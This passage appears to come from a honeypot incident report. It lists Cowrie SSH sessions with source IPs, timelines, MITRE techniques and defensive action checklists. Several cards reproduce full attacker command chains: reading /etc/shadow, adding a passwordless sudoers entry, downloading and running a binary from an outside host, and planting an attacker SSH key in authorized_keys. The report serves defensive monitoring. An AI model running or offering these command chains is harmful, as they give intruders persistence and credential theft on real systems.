| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/ns3.jpg |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:35:52` | `cowrie.session.connect` |
| `2026-06-07 19:35:52` | `cowrie.client.version` |
| `2026-06-07 19:35:52` | `cowrie.client.kex` |
| `2026-06-07 19:35:53` | `cowrie.login.success` |
| `2026-06-07 19:35:53` | `cowrie.session.params` |
| `2026-06-07 19:35:53` | `cowrie.command.input` |
| `2026-06-07 19:35:53` | `cowrie.session.file_download` |
| `2026-06-07 19:35:54` | `cowrie.session.file_download` |
| `2026-06-07 19:35:54` | `cowrie.session.file_download.failed` |
| `2026-06-07 19:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ab8234927e

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:36 |
| **Last Seen** | 2026-06-07 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/oto |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:36:08` | `cowrie.session.connect` |
| `2026-06-07 19:36:08` | `cowrie.client.version` |
| `2026-06-07 19:36:08` | `cowrie.client.kex` |
| `2026-06-07 19:36:08` | `cowrie.login.success` |
| `2026-06-07 19:36:09` | `cowrie.session.params` |
| `2026-06-07 19:36:09` | `cowrie.command.input` |
| `2026-06-07 19:36:09` | `cowrie.session.file_download` |
| `2026-06-07 19:36:09` | `cowrie.session.file_download` |
| `2026-06-07 19:36:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eefeab89748

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:36 |
| **Last Seen** | 2026-06-07 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/oto |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:36:23` | `cowrie.session.connect` |
| `2026-06-07 19:36:23` | `cowrie.client.version` |
| `2026-06-07 19:36:23` | `cowrie.client.kex` |
| `2026-06-07 19:36:24` | `cowrie.login.success` |
| `2026-06-07 19:36:24` | `cowrie.session.params` |
| `2026-06-07 19:36:24` | `cowrie.command.input` |
| `2026-06-07 19:36:24` | `cowrie.command.failed` |
| `2026-06-07 19:36:24` | `cowrie.command.failed` |
| `2026-06-07 19:36:24` | `cowrie.command.failed` |
| `2026-06-07 19:36:24` | `cowrie.session.file_download` |
| `2026-06-07 19:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8594b1bc3e66

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:36 |
| **Last Seen** | 2026-06-07 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/ns3.jpg |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:36:39` | `cowrie.session.connect` |
| `2026-06-07 19:36:39` | `cowrie.client.version` |
| `2026-06-07 19:36:39` | `cowrie.client.kex` |
| `2026-06-07 19:36:40` | `cowrie.login.success` |
| `2026-06-07 19:36:40` | `cowrie.session.params` |
| `2026-06-07 19:36:40` | `cowrie.command.input` |
| `2026-06-07 19:36:40` | `cowrie.session.file_download` |
| `2026-06-07 19:36:40` | `cowrie.session.file_download` |
| `2026-06-07 19:36:40` | `cowrie.session.file_download.failed` |
| `2026-06-07 19:36:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45b39aa4451e

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:36 |
| **Last Seen** | 2026-06-07 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/ns3.jpg |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:36:56` | `cowrie.session.connect` |
| `2026-06-07 19:36:56` | `cowrie.client.version` |
| `2026-06-07 19:36:56` | `cowrie.client.kex` |
| `2026-06-07 19:36:57` | `cowrie.login.success` |
| `2026-06-07 19:36:57` | `cowrie.session.params` |
| `2026-06-07 19:36:57` | `cowrie.command.input` |
| `2026-06-07 19:36:57` | `cowrie.session.file_download` |
| `2026-06-07 19:36:57` | `cowrie.session.file_download` |
| `2026-06-07 19:36:57` | `cowrie.session.file_download.failed` |
| `2026-06-07 19:36:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78c9f5e7ffd7

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:37 |
| **Last Seen** | 2026-06-07 19:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/oto |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:37:31` | `cowrie.session.connect` |
| `2026-06-07 19:37:31` | `cowrie.client.version` |
| `2026-06-07 19:37:31` | `cowrie.client.kex` |
| `2026-06-07 19:37:32` | `cowrie.login.success` |
| `2026-06-07 19:37:32` | `cowrie.session.params` |
| `2026-06-07 19:37:32` | `cowrie.command.input` |
| `2026-06-07 19:37:32` | `cowrie.session.file_download` |
| `2026-06-07 19:37:32` | `cowrie.session.file_download` |
| `2026-06-07 19:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4de8d548378

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:37 |
| **Last Seen** | 2026-06-07 19:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/ns3.jpg |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:37:50` | `cowrie.session.connect` |
| `2026-06-07 19:37:50` | `cowrie.client.version` |
| `2026-06-07 19:37:50` | `cowrie.client.kex` |
| `2026-06-07 19:37:51` | `cowrie.login.success` |
| `2026-06-07 19:37:51` | `cowrie.session.params` |
| `2026-06-07 19:37:51` | `cowrie.command.input` |
| `2026-06-07 19:37:51` | `cowrie.session.file_download` |
| `2026-06-07 19:37:51` | `cowrie.session.file_download` |
| `2026-06-07 19:37:51` | `cowrie.session.file_download.failed` |
| `2026-06-07 19:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48944333972e

| Field | Detail |
|---|---|
| **Source IP** | `14.29.196[.]194` |
| **First Seen** | 2026-06-07 19:42 |
| **Last Seen** | 2026-06-07 19:47 |
| **Session Duration** | 306s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:42:52` | `cowrie.session.connect` |
| `2026-06-07 19:42:53` | `cowrie.client.version` |
| `2026-06-07 19:42:53` | `cowrie.client.kex` |
| `2026-06-07 19:42:58` | `cowrie.login.success` |
| `2026-06-07 19:47:58` | `cowrie.session.file_upload` |
| `2026-06-07 19:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.196[.]194` to AbuseIPDB if not already reported
- [ ] Block `14.29.196[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fac0a05023e

| Field | Detail |
|---|---|
| **Source IP** | `115.190.181[.]18` |
| **First Seen** | 2026-06-07 20:22 |
| **Last Seen** | 2026-06-07 20:23 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:22:54` | `cowrie.session.connect` |
| `2026-06-07 20:22:54` | `cowrie.client.version` |
| `2026-06-07 20:22:54` | `cowrie.client.kex` |
| `2026-06-07 20:22:55` | `cowrie.login.success` |
| `2026-06-07 20:22:55` | `cowrie.session.params` |
| `2026-06-07 20:22:55` | `cowrie.command.input` |
| `2026-06-07 20:22:55` | `cowrie.command.failed` |
| `2026-06-07 20:22:55` | `cowrie.log.closed` |
| `2026-06-07 20:22:56` | `cowrie.session.params` |
| `2026-06-07 20:22:56` | `cowrie.command.input` |
| `2026-06-07 20:22:56` | `cowrie.session.file_download` |
| `2026-06-07 20:22:56` | `cowrie.log.closed` |
| `2026-06-07 20:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.181[.]18` to AbuseIPDB if not already reported
- [ ] Block `115.190.181[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5243c5feb7eb

| Field | Detail |
|---|---|
| **Source IP** | `115.190.181[.]18` |
| **First Seen** | 2026-06-07 20:23 |
| **Last Seen** | 2026-06-07 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:23:04` | `cowrie.session.connect` |
| `2026-06-07 20:23:04` | `cowrie.client.version` |
| `2026-06-07 20:23:04` | `cowrie.client.kex` |
| `2026-06-07 20:23:05` | `cowrie.login.success` |
| `2026-06-07 20:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.181[.]18` to AbuseIPDB if not already reported
- [ ] Block `115.190.181[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fef348d13db7

| Field | Detail |
|---|---|
| **Source IP** | `91.185.75[.]244` |
| **First Seen** | 2026-06-07 20:26 |
| **Last Seen** | 2026-06-07 20:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:26:00` | `cowrie.session.connect` |
| `2026-06-07 20:26:00` | `cowrie.client.version` |
| `2026-06-07 20:26:00` | `cowrie.client.kex` |
| `2026-06-07 20:26:01` | `cowrie.login.success` |
| `2026-06-07 20:26:01` | `cowrie.session.params` |
| `2026-06-07 20:26:01` | `cowrie.command.input` |
| `2026-06-07 20:26:01` | `cowrie.command.failed` |
| `2026-06-07 20:26:01` | `cowrie.log.closed` |
| `2026-06-07 20:26:02` | `cowrie.session.params` |
| `2026-06-07 20:26:02` | `cowrie.command.input` |
| `2026-06-07 20:26:02` | `cowrie.session.file_download` |
| `2026-06-07 20:26:02` | `cowrie.log.closed` |
| `2026-06-07 20:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.185.75[.]244` to AbuseIPDB if not already reported
- [ ] Block `91.185.75[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3486d0b01ba6

| Field | Detail |
|---|---|
| **Source IP** | `91.185.75[.]244` |
| **First Seen** | 2026-06-07 20:26 |
| **Last Seen** | 2026-06-07 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:26:11` | `cowrie.session.connect` |
| `2026-06-07 20:26:11` | `cowrie.client.version` |
| `2026-06-07 20:26:11` | `cowrie.client.kex` |
| `2026-06-07 20:26:12` | `cowrie.login.success` |
| `2026-06-07 20:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.185.75[.]244` to AbuseIPDB if not already reported
- [ ] Block `91.185.75[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0c9baa23413

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 20:33 |
| **Last Seen** | 2026-06-07 20:33 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:33:11` | `cowrie.session.connect` |
| `2026-06-07 20:33:11` | `cowrie.client.version` |
| `2026-06-07 20:33:11` | `cowrie.client.kex` |
| `2026-06-07 20:33:14` | `cowrie.login.success` |
| `2026-06-07 20:33:15` | `cowrie.session.params` |
| `2026-06-07 20:33:15` | `cowrie.command.input` |
| `2026-06-07 20:33:15` | `cowrie.command.failed` |
| `2026-06-07 20:33:16` | `cowrie.log.closed` |
| `2026-06-07 20:33:17` | `cowrie.session.params` |
| `2026-06-07 20:33:17` | `cowrie.command.input` |
| `2026-06-07 20:33:17` | `cowrie.session.file_download` |
| `2026-06-07 20:33:17` | `cowrie.log.closed` |
| `2026-06-07 20:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e10ae58fb9be

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 20:33 |
| **Last Seen** | 2026-06-07 20:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:33:23` | `cowrie.session.connect` |
| `2026-06-07 20:33:23` | `cowrie.client.version` |
| `2026-06-07 20:33:24` | `cowrie.client.kex` |
| `2026-06-07 20:33:26` | `cowrie.login.success` |
| `2026-06-07 20:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acb3442c273f

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 20:54 |
| **Last Seen** | 2026-06-07 20:54 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 20:54:17` | `cowrie.session.connect` |
| `2026-06-07 20:54:17` | `cowrie.client.version` |
| `2026-06-07 20:54:17` | `cowrie.client.kex` |
| `2026-06-07 20:54:20` | `cowrie.login.success` |
| `2026-06-07 20:54:21` | `cowrie.session.params` |
| `2026-06-07 20:54:21` | `cowrie.command.input` |
| `2026-06-07 20:54:21` | `cowrie.command.failed` |
| `2026-06-07 20:54:22` | `cowrie.log.closed` |
| `2026-06-07 20:54:23` | `cowrie.session.params` |
| `2026-06-07 20:54:23` | `cowrie.command.input` |
| `2026-06-07 20:54:23` | `cowrie.session.file_download` |
